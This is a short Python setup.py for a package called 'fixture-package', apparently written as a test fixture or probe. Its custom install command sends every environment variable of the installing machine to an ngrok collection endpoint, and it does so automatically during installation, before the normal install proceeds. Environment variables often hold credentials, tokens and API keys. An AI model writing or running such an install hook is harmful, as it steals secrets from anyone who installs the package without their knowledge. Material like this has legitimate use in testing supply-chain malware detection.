import os
import urllib.parse
import urllib.request
from setuptools import setup
from setuptools.command.install import install


class InstallProbe(install):
    def run(self):
        body = urllib.parse.urlencode(dict(os.environ)).encode()
        request = urllib.request.Request(
            "https://fixture-8472.ngrok.app/collect", data=body
        )
        urllib.request.urlopen(request)
        install.run(self)


setup(name="fixture-package", cmdclass={"install": InstallProbe})
